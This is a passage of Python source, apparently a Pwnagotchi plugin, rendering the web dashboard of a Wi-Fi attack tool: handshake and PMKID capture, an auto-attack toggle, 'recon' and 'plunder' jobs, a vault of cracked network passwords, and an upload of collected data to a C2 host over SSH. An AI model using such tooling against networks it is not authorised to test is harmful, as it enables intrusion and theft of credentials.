    var noteRow = ev.target.closest && ev.target.closest('.note-row');
    if (!noteRow) return;
    var bssid = noteRow.getAttribute('data-bssid');
    var currentNote = noteRow.querySelector('.note-text').textContent;
    if (currentNote === 'tap to add note') currentNote = '';
    var newNote = prompt('Note for ' + bssid + ':', currentNote);
    if (newNote !== null) {{
      fetch('/plugins/wd_scanner/set_note', {{
        method: 'POST',
        credentials: 'same-origin',
        headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
        body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '') +
              '&bssid=' + encodeURIComponent(bssid) +
              '&note=' + encodeURIComponent(newNote)
      }})
        .then(function () {{
          noteRow.querySelector('.note-text').textContent = newNote || 'tap to add note';
          if (newNote) {{
            noteRow.querySelector('.note-text').style.fontStyle = 'normal';
            noteRow.querySelector('.note-text').style.color = 'var(--cyan)';
          }} else {{
            noteRow.querySelector('.note-text').style.fontStyle = 'italic';
            noteRow.querySelector('.note-text').style.color = 'var(--mute)';
          }}
        }})
        .catch(function () {{}});
    }}
  }});

  // ---- Copy-to-clipboard handler ----
  document.addEventListener('click', function (ev) {{
    var t = ev.target;
    if (!t || !t.classList || !t.classList.contains('copy')) return;
    var pw = t.getAttribute('data-pw') || '';
    var done = function () {{
      var orig = t.textContent;
      t.classList.add('ok'); t.textContent = 'copied';
      setTimeout(function () {{ t.classList.remove('ok'); t.textContent = orig; }}, 1200);
    }};
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(pw).then(done, function () {{}});
    }} else {{
      var ta = document.createElement('textarea');
      ta.value = pw; document.body.appendChild(ta); ta.select();
      try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
      document.body.removeChild(ta);
    }}
  }});

  // ---- Collapsible network list ----
  var GRID_KEY = 'wd_grid_collapsed';
  var toggle = document.getElementById('wd-grid-toggle');
  var grid = document.getElementById('wd-grid');

  function applyCollapsed(collapsed) {{
    if (collapsed) {{
      toggle.classList.add('collapsed');
      grid.classList.add('collapsed');
    }} else {{
      toggle.classList.remove('collapsed');
      grid.classList.remove('collapsed');
    }}
  }}

  // Restore saved state.
  var saved = localStorage.getItem(GRID_KEY);
  if (saved === '1') applyCollapsed(true);

  toggle.addEventListener('click', function () {{
    var nowCollapsed = !grid.classList.contains('collapsed');
    applyCollapsed(nowCollapsed);
    localStorage.setItem(GRID_KEY, nowCollapsed ? '1' : '0');
  }});

  // ---- Collapsible action log ----
  var LOG_KEY = 'wd_log_collapsed';
  var logToggle = document.getElementById('wd-log-toggle');
  var logPane = document.getElementById('wd-log');

  function applyLogCollapsed(collapsed) {{
    if (collapsed) {{
      logToggle.classList.add('collapsed');
      logPane.classList.add('collapsed');
    }} else {{
      logToggle.classList.remove('collapsed');
      logPane.classList.remove('collapsed');
    }}
  }}

  // Restore saved state.
  var savedLog = localStorage.getItem(LOG_KEY);
  if (savedLog === '1') applyLogCollapsed(true);

  logToggle.addEventListener('click', function () {{
    var nowCollapsed = !logPane.classList.contains('collapsed');
    applyLogCollapsed(nowCollapsed);
    localStorage.setItem(LOG_KEY, nowCollapsed ? '1' : '0');
  }});

  // ---- Per-SSID collapse ----
  var SSID_PREFIX = 'wd_ssid_';

  function applySsidCollapse() {{
    var toggles = document.querySelectorAll('.ssid-toggle');
    for (var i = 0; i < toggles.length; i++) {{
      var key = toggles[i].getAttribute('data-ssid-key');
      if (!key) continue;
      var stored = localStorage.getItem(SSID_PREFIX + key);
      if (stored === '1') {{
        toggles[i].classList.add('collapsed');
        var parent = toggles[i].closest('.node, .node-group');
        if (parent) parent.classList.add('ssid-collapsed');
      }}
    }}
  }}
  applySsidCollapse();

  document.addEventListener('click', function (ev) {{
    var hdr = ev.target.closest && ev.target.closest('.ssid-toggle');
    if (!hdr) return;
    var key = hdr.getAttribute('data-ssid-key');
    if (!key) return;
    var parent = hdr.closest('.node, .node-group');
    var nowCollapsed = !hdr.classList.contains('collapsed');
    if (nowCollapsed) {{
      hdr.classList.add('collapsed');
      if (parent) parent.classList.add('ssid-collapsed');
    }} else {{
      hdr.classList.remove('collapsed');
      if (parent) parent.classList.remove('ssid-collapsed');
    }}
    localStorage.setItem(SSID_PREFIX + key, nowCollapsed ? '1' : '0');
  }});

  // ---- Handshake toast notification ----
  var toast = document.getElementById('wd-toast');
  var toastMsg = document.getElementById('wd-toast-msg');
  var toastDismiss = document.getElementById('wd-toast-dismiss');
  var knownHandshakes = [];  // track what we've already shown

  function showToast(files) {{
    var n = files.length;
    toastMsg.textContent = '\\u2620 CAPTURED ' + n + ' handshake' + (n > 1 ? 's' : '') + ': ' + files.join(', ');
    toast.classList.add('visible');
  }}

  function hideToast() {{
    toast.classList.remove('visible');
    fetch('/plugins/wd_scanner/dismiss_handshakes', {{
      method: 'POST',
      credentials: 'same-origin',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: 'csrf_token=' + encodeURIComponent(
        (document.querySelector("input[name=csrf_token]") || {{}}).value || ''
      )
    }}).catch(function () {{}});
  }}

  toastDismiss.addEventListener('click', hideToast);

  // ---- Partial reload: swap only dynamic panes every 5 s ----
  var PANES = ['wd-status', 'wd-shotgun', 'wd-grid', 'wd-log', 'wd-recon'];

  function partialRefresh() {{
    var isCollapsed = grid.classList.contains('collapsed');
    fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (!data) return;
        // Check for new handshakes.
        var nh = data.new_handshakes || [];
        if (nh.length > 0 && JSON.stringify(nh) !== JSON.stringify(knownHandshakes)) {{
          knownHandshakes = nh;
          showToast(nh);
        }}
      }})
      .catch(function () {{}});

    // Also refresh the HTML panes.
    fetch(window.location.href, {{ credentials: 'same-origin' }})
      .then(function (r) {{ return r.ok ? r.text() : null; }})
      .then(function (html) {{
        if (!html) return;
        var doc = new DOMParser().parseFromString(html, 'text/html');
        for (var i = 0; i < PANES.length; i++) {{
          var id = PANES[i];
          var fresh = doc.getElementById(id);
          var local = document.getElementById(id);
          if (fresh && local) {{
            local.innerHTML = fresh.innerHTML;
          }}
        }}
        // Re-apply collapsed state after DOM swap.
        applyCollapsed(isCollapsed);
        applySsidCollapse();
      }})
      .catch(function () {{}});
  }}

  setInterval(partialRefresh, 5000);

  // ---- Terminal popup for recon/plunder ----
  var terminalOverlay = document.getElementById('terminal-overlay');
  var terminalTitle = document.getElementById('terminal-title');
  var terminalOutput = document.getElementById('terminal-output');
  var terminalClose = document.getElementById('terminal-close');
  var terminalPollInterval = null;
  var terminalLogOffset = 0;
  var terminalMode = null;  // 'recon' or 'plunder'

  function showTerminal(mode) {{
    terminalMode = mode;
    terminalLogOffset = 0;
    terminalOutput.innerHTML = '';
    terminalTitle.textContent = mode === 'recon' ? 'RECON IN PROGRESS' : 'PLUNDER IN PROGRESS';
    terminalOverlay.classList.add('visible');

    // Start polling for logs.
    if (terminalPollInterval) clearInterval(terminalPollInterval);
    pollTerminalLogs();
    terminalPollInterval = setInterval(pollTerminalLogs, 1000);
  }}

  function hideTerminal() {{
    terminalOverlay.classList.remove('visible');
    if (terminalPollInterval) {{
      clearInterval(terminalPollInterval);
      terminalPollInterval = null;
    }}
    terminalMode = null;
    terminalLogOffset = 0;
  }}

  function pollTerminalLogs() {{
    fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (!data) return;

        var running, logs;
        if (terminalMode === 'debug') {{
          running = data.debug_enabled;
          logs = data.debug_log || [];
        }} else if (terminalMode === 'recon') {{
          running = data.recon_running;
          logs = data.recon_log || [];
        }} else if (terminalMode === 'plunder') {{
          running = data.plunder_running;
          logs = data.plunder_log || [];
        }} else {{
          running = false;
          logs = [];
        }}

        // Append new log lines.
        if (logs.length > terminalLogOffset) {{
          var newLines = logs.slice(terminalLogOffset);
          for (var i = 0; i < newLines.length; i++) {{
            var line = document.createElement('div');
            line.className = 'terminal-line';
            var text = newLines[i];
            // Colorize based on keywords.
            if (text.match(/ERROR|ABORT|failed|missing/i)) {{
              line.classList.add('error');
            }} else if (text.match(/WARNING|WARN/i)) {{
              line.classList.add('warn');
            }} else if (text.match(/step \\d|>>>|OK|launched|completed|SUCCESS/i)) {{
              line.classList.add('info');
            }}
            line.textContent = text;
            terminalOutput.appendChild(line);
          }}
          terminalLogOffset = logs.length;
          // Auto-scroll to bottom.
          terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }}

        // If operation finished, stop polling.
        if (!running && terminalLogOffset > 0) {{
          if (terminalPollInterval) {{
            clearInterval(terminalPollInterval);
            terminalPollInterval = null;
          }}
        }}
      }})
      .catch(function () {{}});
  }}

  terminalClose.addEventListener('click', hideTerminal);

  // Auto-show terminal when recon/plunder starts.
  var lastReconRunning = false;
  var lastPlunderRunning = false;

  function checkForOperations() {{
    fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (!data) return;

        // Show terminal if recon just started.
        if (data.recon_running && !lastReconRunning && !terminalOverlay.classList.contains('visible')) {{
          showTerminal('recon');
        }}
        lastReconRunning = data.recon_running;

        // Show terminal if plunder just started.
        if (data.plunder_running && !lastPlunderRunning && !terminalOverlay.classList.contains('visible')) {{
          showTerminal('plunder');
        }}
        lastPlunderRunning = data.plunder_running;
      }})
      .catch(function () {{}});
  }}

  setInterval(checkForOperations, 1000);

  // ---- Modal dialogs ----
  var filterModal = document.getElementById('filter-modal');
  var c2Modal = document.getElementById('c2-modal');

  document.querySelectorAll('.modal-close').forEach(function (btn) {{
    btn.addEventListener('click', function () {{
      var modal = document.getElementById(btn.getAttribute('data-modal'));
      if (modal) modal.classList.remove('visible');
    }});
  }});

  document.getElementById('show-filters').addEventListener('click', function () {{
    filterModal.classList.add('visible');
  }});

  document.getElementById('show-c2').addEventListener('click', function () {{
    c2Modal.classList.add('visible');
  }});

  // ---- Toggle buttons ----
  document.getElementById('toggle-pmkid').addEventListener('click', function () {{
    fetch('/plugins/wd_scanner/toggle_pmkid', {{
      method: 'POST',
      credentials: 'same-origin',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '')
    }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (data) {{
          document.getElementById('pmkid-state').textContent = data.enabled ? 'ON' : 'OFF';
        }}
      }})
      .catch(function () {{}});
  }});

  document.getElementById('toggle-auto-attack').addEventListener('click', function () {{
    fetch('/plugins/wd_scanner/toggle_auto_attack', {{
      method: 'POST',
      credentials: 'same-origin',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '')
    }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (data) {{
          document.getElementById('auto-attack-state').textContent = data.enabled ? 'ON' : 'OFF';
        }}
      }})
      .catch(function () {{}});
  }});

  document.getElementById('toggle-debug').addEventListener('click', function () {{
    fetch('/plugins/wd_scanner/toggle_debug', {{
      method: 'POST',
      credentials: 'same-origin',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '')
    }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (data) {{
          document.getElementById('debug-state').textContent = data.enabled ? 'ON' : 'OFF';
          if (data.enabled) {{
            // Show debug terminal immediately.
            showTerminal('debug');
          }}
        }}
      }})
      .catch(function () {{}});
  }});

  // ---- Filter controls ----
  document.getElementById('apply-filters').addEventListener('click', function () {{
    var signal = document.getElementById('filter-signal').value;
    var clients = document.getElementById('filter-clients').value;
    var security = document.getElementById('filter-security').value;
    var hidePwned = document.getElementById('filter-hide-pwned').checked;

    fetch('/plugins/wd_scanner/set_filter', {{
      method: 'POST',
      credentials: 'same-origin',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '') +
            '&min_signal=' + encodeURIComponent(signal) +
            '&min_clients=' + encodeURIComponent(clients) +
            '&security=' + encodeURIComponent(security) +
            '&hide_pwned=' + (hidePwned ? '1' : '')
    }})
      .then(function () {{
        filterModal.classList.remove('visible');
        alert('Filters applied');
      }})
      .catch(function () {{}});
  }});

  // ---- C2 upload ----
  document.getElementById('start-c2-upload').addEventListener('click', function () {{
    var key = document.getElementById('c2-key').value.trim();
    var bssid = document.getElementById('c2-bssid').value.trim();

    if (!key) {{
      alert('SSH key required');
      return;
    }}

    if (!confirm('Upload data to C2? Key will NOT be saved to disk.')) {{
      return;
    }}

    fetch('/plugins/wd_scanner/c2_upload', {{
      method: 'POST',
      credentials: 'same-origin',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: 'csrf_token=' + encodeURIComponent((document.querySelector("input[name=csrf_token]") || {{}}).value || '') +
            '&ssh_key=' + encodeURIComponent(key) +
            '&bssid=' + encodeURIComponent(bssid)
    }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (data && data.ok) {{
          // Clear key immediately.
          document.getElementById('c2-key').value = '';
          c2Modal.classList.remove('visible');
          // Show terminal for C2 upload.
          showTerminal('c2');
        }} else {{
          alert('Upload failed: ' + (data ? data.error : 'unknown error'));
        }}
      }})
      .catch(function () {{
        alert('Upload request failed');
      }});
  }});

  // Auto-show terminal for C2 uploads.
  var lastC2Running = false;
  setInterval(function () {{
    fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
      .then(function (r) {{ return r.ok ? r.json() : null; }})
      .then(function (data) {{
        if (!data) return;
        if (data.c2_upload_running && !lastC2Running && !terminalOverlay.classList.contains('visible')) {{
          terminalMode = 'c2';
          terminalLogOffset = 0;
          terminalOutput.innerHTML = '';
          terminalTitle.textContent = 'C2 UPLOAD IN PROGRESS';
          terminalOverlay.classList.add('visible');
          if (terminalPollInterval) clearInterval(terminalPollInterval);
          terminalPollInterval = setInterval(function () {{
            fetch('/plugins/wd_scanner/status.json', {{ credentials: 'same-origin' }})
              .then(function (r) {{ return r.ok ? r.json() : null; }})
              .then(function (d) {{
                if (!d) return;
                var logs = d.c2_upload_log || [];
                if (logs.length > terminalLogOffset) {{
                  var newLines = logs.slice(terminalLogOffset);
                  for (var i = 0; i < newLines.length; i++) {{
                    var line = document.createElement('div');
                    line.className = 'terminal-line';
                    var text = newLines[i];
                    if (text.match(/ERROR|FAILED/i)) line.classList.add('error');
                    else if (text.match(/WARNING/i)) line.classList.add('warn');
                    else if (text.match(/OK|complete/i)) line.classList.add('info');
                    line.textContent = text;
                    terminalOutput.appendChild(line);
                  }}
                  terminalLogOffset = logs.length;
                  terminalOutput.scrollTop = terminalOutput.scrollHeight;
                }}
                if (!d.c2_upload_running && terminalLogOffset > 0 && terminalPollInterval) {{
                  clearInterval(terminalPollInterval);
                  terminalPollInterval = null;
                }}
              }});
          }}, 1000);
        }}
        lastC2Running = data.c2_upload_running;
      }});
  }}, 1000);
}})();
</script>
</body></html>
""".format(
            csrf=csrf_input,
            iface=escape(self._iface_cfg or "—"),
            mon=escape(self._mon_iface or "—"),
            scan_state=scan_state,
            attack_state=attack_state,
            scan_cls="run" if self._scan_running else "",
            atk_cls="busy" if self._action_running else "",
            secs=self._scan_seconds,
            scan_disabled="disabled" if (self._scan_running or not has_iface) else "",
            options="\n".join(opt_lines),
            pick_disabled="disabled" if (self._scan_running or self._action_running) else "",
            release_disabled="disabled" if (
                not has_iface or self._scan_running or self._action_running
            ) else "",
            passive_options="\n".join(passive_opt_lines),
            passive_state_cls="run" if self._passive_running else "idle",
            passive_state_text=("RUNNING" if self._passive_running
                               else ("IDLE" if self._passive_iface_cfg else "—")),
            passive_hs=self._passive_handshakes,
            select_err=select_err_html,
            select_hint=(
                "" if has_iface
                else "<div class='hint'>// pick an auxiliary radio above to begin //</div>"
            ),
            cards="\n".join(cards) if cards else empty_state,
            log=action_log,
            update_panel=update_panel_html,
            restart_banner=restart_banner_html,
            shared_warn=shared_warn_html,
            shotgun_panel=shotgun_panel_html,
            recon_panel=recon_panel_html,
            pwned_count=len(self._compact_pwned_list(cracked)),
            recon_count=len(self._list_recon_reports()),
            plunder_count=len(self._list_plunder_jobs()),
            pmkid_disabled="" if self._pmkid_available else "disabled",
            pmkid_state="ON" if self._pmkid_attack_mode else "OFF",
            auto_attack_state="ON" if self._auto_attack else "OFF",
            debug_state="ON" if self._debug_enabled else "OFF",
            c2_host=escape(self._c2_host or "not configured"),
        )
        return body

    def _render_update_panel(self):
        """Return (panel_html, restart_banner_html)."""
        local_v = self.__version__
        remote_v = self._update_remote_version
        last_status = self._update_last_status or "not yet checked"
        in_flight = self._update_in_flight
        pending = self._update_pending_restart

        # Classify the status.
        cls = "ok"
        sl = (last_status or "").lower()
        if "error" in sl or "suspicious" in sl or "syntax" in sl:
            cls = "bad"
        elif "available" in sl or "installed" in sl:
            cls = "warn"
        elif "up-to-date" in sl:
            cls = "ok"
        else:
            cls = "pending"

        if in_flight:
            cls = "pending"
            last_status = "checking..."

        if self._update_last_check:
            last_check = time.strftime(
                "%Y-%m-%d %H:%M:%S",
                time.localtime(self._update_last_check),
            )
        else:
            last_check = "never"

        # Decide whether to show the explicit INSTALL button:
        # - status announces an update is available, AND we have a different remote sha
        update_available = bool(
            self._update_remote_sha
            and self._update_local_sha
            and self._update_remote_sha != self._update_local_sha
        )

        check_disabled = "disabled" if in_flight else ""
        install_disabled = "disabled" if (in_flight or not update_available) else ""

        # Truncate sha for display.
        def _short(s):
            return (s[:12] + "...") if s and len(s) > 12 else (s or "—")

        csrf_input = self._csrf_input()
        panel = (
            "<div class='upd'>"
            "  <h3>updates // {url_short}</h3>"
            "  <dl class='upd-grid'>"
            "    <div><dt>installed</dt><dd>v{local_v} <span class='mute'>({local_sha})</span></dd></div>"
            "    <div><dt>remote</dt><dd>v{remote_v} <span class='mute'>({remote_sha})</span></dd></div>"
            "    <div><dt>last check</dt><dd>{last_check}</dd></div>"
            "    <div><dt>status</dt><dd class='{cls}'>{status}</dd></div>"
            "  </dl>"
            "  <div class='upd-actions'>"
            "    <form method='POST' action='/plugins/wd_scanner/check_update'>"
            "      {csrf}"
            "      <button type='submit' class='btn' {check_disabled}>&#8635; CHECK NOW</button>"
            "    </form>"
            "    <form method='POST' action='/plugins/wd_scanner/install_update'"
            "          onsubmit=\"return confirm('Install update from\\n{url_js}?');\">"
            "      {csrf}"
            "      <button type='submit' class='btn alt' {install_disabled}>&#9660; INSTALL</button>"
            "    </form>"
            "    <form method='POST' action='/plugins/wd_scanner/restart_service'"
            "          onsubmit=\"return confirm('// RESTART PWNAGOTCHI\\nThe service will go down for a few seconds.\\nContinue?');\">"
            "      {csrf}"
            "      <button type='submit' class='btn danger'>&#x21bb; RESTART</button>"
            "    </form>"
            "  </div>"
            "</div>"
        ).format(
            url_short=escape(self._update_url.split("/")[-1] if self._update_url else "?"),
            url_js=escape(self._update_url).replace("'", ""),
            local_v=escape(local_v),
            remote_v=escape(remote_v or "?"),
            local_sha=escape(_short(self._update_local_sha)),
            remote_sha=escape(_short(self._update_remote_sha)),
            last_check=escape(last_check),
            status=escape(last_status),
            cls=cls,
            csrf=csrf_input,
            check_disabled=check_disabled,
            install_disabled=install_disabled,
        )

        if pending:
            banner = (
                "<div class='restart-banner'>"
                "<span>&#9888;</span>"
                "<span><b>RESTART REQUIRED</b> &mdash; "
                "update v{rv} installed; run <code>systemctl restart pwnagotchi</code> to activate.</span>"
                "</div>"
            ).format(rv=escape(remote_v or "?"))
        else:
            banner = ""

        return panel, banner

    # ---------------------------------------------------------- pwned vault

    def _compact_pwned_list(self, idx):
        """
        Convert the raw `_load_cracked_index` map (which has bssid-keyed,
        ssid-keyed and origcase-keyed entries) into a deduped list of
        {ssid, bssid, password} rows for the UI / JSON.
        """
        # Helper: original-case SSID lookup.
        def _ssid_orig(lower):
            return idx.get("__origcase__::" + lower) or lower

        seen = {}
        # First pass: BSSID-keyed entries are most reliable.
        for k, pw in idx.items():
            if k.startswith("ssid::") or k.startswith("__origcase__::"):
                continue
            if not re.match(r"^[0-9a-f:]{17}$", k):
                continue
            seen[k] = {"bssid": k, "password": pw, "ssid": ""}

        # Second pass: SSID-keyed entries fill in gaps + name BSSID rows.
        for k, pw in idx.items():
            if not k.startswith("ssid::"):
                continue
            ssid_lower = k[len("ssid::"):]
            ssid = _ssid_orig(ssid_lower)
            attached = False
            for row in seen.values():
                if not row["ssid"] and row["password"] == pw:
                    row["ssid"] = ssid
                    attached = True
                    break
            if not attached:
                seen["ssid::" + ssid_lower] = {
                    "bssid": "",
                    "password": pw,
                    "ssid": ssid,
                }
        # Sort: rows with both ssid+bssid first, then alphabetical SSID.
        rows = list(seen.values())
        rows.sort(key=lambda r: (
            0 if (r["ssid"] and r["bssid"]) else 1,
            (r["ssid"] or "").lower(),
            r["bssid"],
        ))
        return rows

    def _render_pwned(self):
        cracked = self._load_cracked_index()
        rows = self._compact_pwned_list(cracked)
        n = len(rows)

        if rows:
            row_html = []
            for r in rows:
                ssid = escape(r["ssid"] or "<unknown ssid>")
                bssid = escape(r["bssid"] or "—")
                pw = escape(r["password"])
                pw_attr = pw.replace("&#x27;", "&apos;")
                row_html.append(
                    "<article class='vault-row'>"
                    "  <header class='vault-h'>"
                    "    <span class='vault-ssid'>{ssid}</span>"
                    "    <span class='badge-pwned'>&#x2713; PWNED</span>"
                    "  </header>"
                    "  <dl class='vault-meta'>"
                    "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
                    "    <div class='vault-pw'>"
                    "      <dt>PASSWORD</dt>"
                    "      <dd><code class='pw-val'>{pw}</code>"
                    "      <button type='button' class='copy' data-pw='{pw_attr}' "
                    "aria-label='copy password'>copy</button></dd>"
                    "    </div>"
                    "  </dl>"
                    "</article>".format(ssid=ssid, bssid=bssid, pw=pw, pw_attr=pw_attr)
                )
            list_html = "\n".join(row_html)
        else:
            list_html = (
                "<div class='empty'>"
                "<div class='empty-glyph'>&#x1f512;</div>"
                "<p>// VAULT EMPTY</p>"
                "<small>no cracked handshakes found in {dir}</small>"
                "</div>".format(dir=escape(self._handshake_dir() or "?"))
            )

        body = """\
<!doctype html>
<html lang='en'>
<head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1, viewport-fit=cover'>
<meta name='theme-color' content='#0a0d10'>
<title>ctOS // pwned vault</title>
<style>
:root {{
  --bg: #07090b; --panel: #111820; --grid: #1a232c;
  --fg: #d8e4ec; --mute: #6c7c89;
  --cyan: #00e5ff; --orange: #ff7a00; --green: #2bff88;
}}
* {{ box-sizing: border-box; }}
html, body {{ margin: 0; padding: 0; }}
body {{
  background:
    radial-gradient(1200px 600px at 50% -10%, rgba(43,255,136,.08), transparent 60%),
    repeating-linear-gradient(0deg, rgba(255,255,255,.015) 0 1px, transparent 1px 3px),
    var(--bg);
  color: var(--fg);
  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
  font-size: 14px; line-height: 1.4; min-height: 100vh;
  padding: env(safe-area-inset-top) env(safe-area-inset-right)
           env(safe-area-inset-bottom) env(safe-area-inset-left);
}}
body::before {{
  content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 50;
  background: repeating-linear-gradient(180deg, rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
  mix-blend-mode: multiply;
}}
.wrap {{ max-width: 720px; margin: 0 auto; padding: 12px; }}
.brand {{
  display: flex; align-items: center; gap: 10px;
  padding: 10px 12px; margin-bottom: 10px;
  border: 1px solid var(--grid);
  background: linear-gradient(180deg, #0e141a, #0a0e12);
  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%);
}}
.brand .mark {{
  width: 28px; height: 28px; display: grid; place-items: center;
  border: 1px solid var(--green); color: var(--green);
  font-weight: 700; text-shadow: 0 0 6px rgba(43,255,136,.6);
}}
.brand h1 {{
  margin: 0; font-size: 14px; letter-spacing: .25em;
  text-transform: uppercase; color: var(--fg);
}}
.brand h1 b {{ color: var(--green); }}
.brand .sub {{ margin-left: auto; font-size: 11px; color: var(--mute); letter-spacing: .2em; }}

.nav {{
  display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap;
}}
.nav a {{
  flex: 1; min-width: 120px;
  display: inline-flex; align-items: center; justify-content: center;
  height: 40px; padding: 0 12px;
  font: inherit; font-weight: 700; letter-spacing: .2em; text-transform: uppercase;
  background: #06292e; color: var(--cyan);
  border: 1px solid var(--cyan);
  text-decoration: none;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
}}
.nav a.active {{ background: #052618; color: var(--green); border-color: var(--green); }}

.count {{
  display: inline-block; padding: 2px 8px; margin-left: 8px;
  background: var(--green); color: #002912;
  font-weight: 700; font-size: 11px; letter-spacing: .2em;
}}
.section-h {{
  margin: 8px 0 12px; font-size: 11px; letter-spacing: .3em;
  color: var(--mute); text-transform: uppercase;
  display: flex; align-items: center; gap: 8px;
}}
.section-h::before, .section-h::after {{
  content: ''; flex: 1; height: 1px; background: var(--grid);
}}

.vault-row {{
  position: relative;
  background: linear-gradient(180deg, #0c1d12, #07120a);
  border: 1px solid var(--green);
  padding: 12px;
  margin-bottom: 10px;
  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
  box-shadow: 0 0 0 1px rgba(43,255,136,.15);
}}
.vault-row::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--green); box-shadow: 0 0 12px rgba(43,255,136,.6);
}}
.vault-h {{
  display: flex; align-items: center; justify-content: space-between;
  gap: 10px; margin-bottom: 8px;
}}
.vault-ssid {{
  font-size: 16px; font-weight: 700; color: var(--green);
  text-shadow: 0 0 8px rgba(43,255,136,.4);
  word-break: break-all; letter-spacing: .04em;
}}
.badge-pwned {{
  display: inline-block; padding: 2px 8px;
  font-size: 10px; font-weight: 700; letter-spacing: .3em;
  background: var(--green); color: #002912; border: 1px solid var(--green);
  clip-path: polygon(4px 0, 100% 0, calc(100% - 4px) 100%, 0 100%);
}}
.vault-meta {{
  display: grid; grid-template-columns: 1fr; gap: 6px 10px; margin: 0;
}}
.vault-meta > div {{
  display: flex; flex-direction: column;
  border-left: 1px dashed #1f2a33; padding: 2px 0 2px 8px;
}}
.vault-meta dt {{
  font-size: 10px; letter-spacing: .25em; color: var(--mute);
  text-transform: uppercase;
}}
.vault-meta dd {{ margin: 1px 0 0; color: var(--fg); word-break: break-all; }}
.vault-meta code {{ color: var(--cyan); font-size: 12px; }}
.vault-pw {{ border-left: 2px solid var(--green) !important; background: rgba(43,255,136,.05); }}
.vault-pw dt {{ color: var(--green) !important; }}
.vault-pw dd {{ display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }}
.vault-pw .pw-val {{
  color: var(--green) !important; font-size: 14px !important;
  font-weight: 700; word-break: break-all; text-shadow: 0 0 6px rgba(43,255,136,.4);
}}
.vault-pw .copy {{
  appearance: none; -webkit-appearance: none;
  background: transparent; border: 1px solid var(--green); color: var(--green);
  font: inherit; font-size: 10px; letter-spacing: .25em; text-transform: uppercase;
  padding: 4px 8px; cursor: pointer;
}}
.vault-pw .copy.ok {{ background: var(--green); color: #002912; }}

.empty {{ text-align: center; padding: 40px 12px; border: 1px dashed var(--grid); color: var(--mute); }}
.empty-glyph {{ font-size: 42px; color: var(--green); opacity: .6; }}
.empty p {{ margin: 8px 0 4px; letter-spacing: .25em; color: var(--fg); }}

@media (min-width: 560px) {{
  body {{ font-size: 15px; }}
  .vault-meta {{ grid-template-columns: 1fr 2fr; }}
}}

footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute);
  font-size: 10px; letter-spacing: .35em; }}
</style>
</head>
<body>
<div class='wrap'>
  <div class='brand'>
    <div class='mark'>&#x2713;</div>
    <h1>ct<b>OS</b> // pwned vault</h1>
    <span class='sub'>DedSec</span>
  </div>

  <nav class='nav'>
    <a href='/plugins/wd_scanner/'>&larr; SCANNER</a>
    <a href='/plugins/wd_scanner/pwned' class='active'>VAULT <span class='count'>{n}</span></a>
  </nav>

  <div class='section-h'>recovered keys</div>
  {list_html}

  <footer class='tag'>// the truth will set us free //</footer>
</div>
<script>
(function () {{
  document.addEventListener('click', function (ev) {{
    var t = ev.target;
    if (!t || !t.classList || !t.classList.contains('copy')) return;
    var pw = t.getAttribute('data-pw') || '';
    var done = function () {{
      var orig = t.textContent;
      t.classList.add('ok'); t.textContent = 'copied';
      setTimeout(function () {{ t.classList.remove('ok'); t.textContent = orig; }}, 1200);
    }};
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(pw).then(done, function () {{}});
    }} else {{
      var ta = document.createElement('textarea');
      ta.value = pw; document.body.appendChild(ta); ta.select();
      try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
      document.body.removeChild(ta);
    }}
  }});
}})();
</script>
</body></html>
""".format(n=n, list_html=list_html)
        return body

    # -------------------------------------------------------- recon viewer

    def _render_recon_list(self):
        reports = self._list_recon_reports()
        running = self._recon_running
        csrf_input = self._csrf_input()
        rows = []
        for r in reports:
            rep = self._load_recon_report(r["name"]) or {}
            ssid = escape(rep.get("ssid") or "?")
